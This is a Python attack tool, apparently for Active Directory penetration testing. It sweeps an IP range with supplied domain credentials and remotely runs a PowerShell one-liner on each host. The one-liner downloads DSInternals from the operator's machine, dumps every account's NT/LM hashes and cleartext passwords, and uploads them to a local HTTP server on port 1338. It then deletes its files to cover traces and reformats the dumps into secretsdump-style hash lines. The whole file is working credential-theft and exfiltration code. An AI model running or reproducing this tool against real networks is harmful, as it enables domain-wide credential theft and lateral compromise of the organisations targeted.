#!/usr/bin/env python3
import os
import threading
import subprocess
import argparse
import re
import socket
import string
from http.server import SimpleHTTPRequestHandler, HTTPServer
from concurrent.futures import ThreadPoolExecutor, as_completed

DSINTERNALS_URL = "https://github.com/MichaelGrafnetter/DSInternals/releases/download/v6.2/DSInternals_v6.2.zip"
DSINTERNALS_ZIP = "DSInternals_v6.2.zip"
EXEC_SCRIPT = "exec_across_windows.py"
UPLOAD_DIR = "./secretsdump_ng_out/"


def parse_ip_range(ip_range):
    """Parse IP range like 10.0.1-5.1-254 into list of IPs"""
    parts = ip_range.split('.')
    if len(parts) != 4:
        raise SystemExit("Invalid IP range format")

    def expand(part):
        vals = []
        for section in part.split(','):
            if '-' in section:
                s, e = map(int, section.split('-'))
                vals.extend(range(s, e + 1))
            else:
                vals.append(int(section))
        return vals

    expanded = [expand(p) for p in parts]
    return [
        f"{a}.{b}.{c}.{d}"
        for a in expanded[0]
        for b in expanded[1]
        for c in expanded[2]
        for d in expanded[3]
    ]


def get_host_ip_given_target(target_ip):
    """Get the local IP address used to reach a target IP"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((target_ip, 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception as e:
        return None


def parse_ds_file(filepath):
    """Parse DSInternals dump file and extract credentials"""
    
    # Read file - PowerShell outputs in UTF-16LE by default
    try:
        with open(filepath, 'r', encoding='utf-16-le', errors='ignore') as f:
            content = f.read()
    except:
        # Fallback to UTF-8 if UTF-16 fails
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
    
    # Split into individual account entries
    entries = []
    current_entry = {}
    
    for line in content.split('\n'):
        line = line.strip()
        
        # Skip empty lines
        if not line:
            continue
        
        # New entry starts with DistinguishedName
        if line.startswith('DistinguishedName:'):
            if current_entry:
                entries.append(current_entry)
            current_entry = {}
        
        # Extract SamAccountName
        elif line.startswith('SamAccountName:'):
            current_entry['sam'] = line.split(':', 1)[1].strip()
        
        # Extract SID for RID
        elif line.startswith('Sid:'):
            sid = line.split(':', 1)[1].strip()
            current_entry['rid'] = sid.split('-')[-1]
        
        # Extract NT hash
        elif line.startswith('NTHash:'):
            nt_hash = line.split(':', 1)[1].strip()
            if nt_hash:
                current_entry['nt'] = nt_hash
        
        # Extract LM hash
        elif line.startswith('LMHash:'):
            lm_hash = line.split(':', 1)[1].strip()
            if lm_hash:
                current_entry['lm'] = lm_hash
        
        # Extract cleartext password
        elif line.startswith('ClearText:'):
            cleartext = line.split(':', 1)[1].strip()
            if cleartext and all(ord(c) < 128 and c in string.printable for c in cleartext):
                current_entry['cleartext'] = cleartext
    
    # Don't forget last entry
    if current_entry:
        entries.append(current_entry)
    
    return entries


def format_output(entries):
    """Format entries in secretsdump style"""
    
    lines = []
    cleartext_lines = []
    
    for entry in entries:
        sam = entry.get('sam', '')
        rid = entry.get('rid', '')
        lm = entry.get('lm', 'aad3b435b51404eeaad3b435b51404ee')
        nt = entry.get('nt', 'aad3b435b51404eeaad3b435b51404ee')
        
        # Skip entries without basic info
        if not sam or not rid:
            continue
        
        # Format hash line
        lines.append(f"{sam}:{rid}:{lm}:{nt}:::")
        
        # Collect cleartext if available
        if 'cleartext' in entry:
            cleartext_lines.append(f"{sam}:CLEARTEXT:{entry['cleartext']}")
    
    # Add cleartext section if any exist
    if cleartext_lines:
        lines.append("")
        lines.append("[*] ClearText passwords grabbed")
        lines.extend(cleartext_lines)
    
    return '\n'.join(lines)


def process_uploaded_file(filepath):
    """Process uploaded file and overwrite with formatted credentials"""
    try:
        entries = parse_ds_file(filepath)
        output = format_output(entries)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(output)
        
    except Exception as e:
        print(f"[!] Error processing {filepath}: {e}")


class FileUploadHTTPRequestHandler(SimpleHTTPRequestHandler):
    """HTTP handler for receiving credential dumps"""
    
    def do_POST(self):
        os.makedirs(UPLOAD_DIR, exist_ok=True)
        
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(content_length)
            
            filename = self.headers.get('filename', 'upload.bin')
            filename = os.path.basename(filename)
            
            out_path = os.path.join(UPLOAD_DIR, filename)
            
            # Write raw data
            with open(out_path, 'wb') as f:
                f.write(data)
            
            # Process it
            process_uploaded_file(out_path)
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
            
            print(f"\033[32m[+]\033[0m Credentials saved: {out_path}")
            
        except Exception as e:
            print(f"[!] Upload error: {e}")
            self.send_response(500)
            self.end_headers()


def start_upload_server():
    """Start HTTP server for receiving credential uploads on port 1338"""
    # Serve files from UPLOAD_DIR
    class CustomHandler(FileUploadHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory=UPLOAD_DIR, **kwargs)
    
    server = HTTPServer(("0.0.0.0", 1338), CustomHandler)
    server.serve_forever()


print_lock = threading.Lock()


def generate_command(ip, username, password, just_dc_user, verbose, show_output):
    """Generate and execute PowerShell command for target"""

    host_ip = get_host_ip_given_target(ip)

    # Build Get-ADReplAccount command
    if just_dc_user:
        repl_cmd = f"Get-ADReplAccount -Server LOCALHOST -SamAccountName {just_dc_user}"
    else:
        repl_cmd = "Get-ADReplAccount -All -Server LOCALHOST"

    ps_cmd = (
        f'iwr http://{host_ip}:1338/{DSINTERNALS_ZIP} -o C:\\ProgramData\\DSInternals.zip; '
        f'Expand-Archive C:\\ProgramData\\DSInternals.zip -d C:\\ProgramData\\DSInternals\\; '
        f'Import-Module C:\\ProgramData\\DSInternals\\DSInternals\\DSInternals.psd1; '
        f'{repl_cmd} > C:\\ProgramData\\ntds_{ip}.out; '
        f'iwr -Uri "http://{host_ip}:1338/upload" -Method Post '
        f'-InFile "C:\\ProgramData\\ntds_{ip}.out" '
        f'-Headers @{{"filename"="ntds_{ip}.out"}} -UseBasicParsing; '
        f'del C:\\ProgramData\\ntds_{ip}.out; '
        f'del C:\\ProgramData\\DSInternals.zip; '
        f'Remove-Item -Recurse -Force C:\\ProgramData\\DSInternals\\'
    )

    exec_cmd = [
        "python3", EXEC_SCRIPT,
        ip, username, password,
        ps_cmd,
        "--timeout", "30",
        "--threads", "1"
    ]
    
    # Add -o flag if show_output is enabled
    if show_output:
        exec_cmd.append("-o")

    try:
        if verbose:
            # Show output
            subprocess.run(exec_cmd)
        else:
            # Suppress output
            subprocess.run(exec_cmd, capture_output=True)
    except Exception as e:
        with print_lock:
            print(f"[!] Error on {ip}: {e}")


def main(args):
    """Main execution function"""
    
    dsinternals_path = os.path.join(UPLOAD_DIR, DSINTERNALS_ZIP)
    
    if not os.path.exists(dsinternals_path):
        print("[*] Downloading DSInternals...")
        try:
            subprocess.check_call(["wget", "-q", "-O", dsinternals_path, DSINTERNALS_URL])
        except subprocess.CalledProcessError:
            print("[!] Failed to download DSInternals. Please download manually.")
            return

    if not os.path.exists(EXEC_SCRIPT):
        print(f"[!] {EXEC_SCRIPT} not found. Please ensure it exists.")
        return

    print("[*] Starting HTTP server...")
    print("[*] File and upload server listening on port 1338")
    threading.Thread(target=start_upload_server, daemon=True).start()

    targets = parse_ip_range(args.ip_range)
    print(f"[*] Targeting {len(targets)} hosts")
    print(f"[*] Using credentials: {args.username}")
    if args.just_dc_user:
        print(f"[*] Dumping only user: {args.just_dc_user}")
    print(f"[*] Credentials will be saved within: {os.path.abspath(UPLOAD_DIR)}/\n")

    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        futures = [
            pool.submit(
                generate_command,
                ip,
                args.username,
                args.password,
                args.just_dc_user,
                args.verbose,
                args.show_output
            )
            for ip in targets
        ]
        for _ in as_completed(futures):
            pass

    print("\n[*] All tasks completed. Server still running.")
    print("[*] Press Ctrl+C to exit.")
    
    try:
        while True:
            threading.Event().wait(1)
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="DSInternals automation for security testing"
    )

    os.makedirs(UPLOAD_DIR, exist_ok=True)

    parser.add_argument("ip_range", help="IP range (e.g. 10.0.1-5.1-254)")
    parser.add_argument("username", help="Domain username")
    parser.add_argument("password", help="Password")

    parser.add_argument("-t", "--threads", type=int, default=10,
                        help="Number of concurrent threads (default: 10)")
    parser.add_argument("-just-dc-user", dest="just_dc_user", 
                        help="Extract only one user (mimics secretsdump)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Show exec_across_windows output")
    parser.add_argument("-o", "--show-output", action="store_true",
                        help="Show command output from target (may trip Defender)")

    args = parser.parse_args()

    main(args)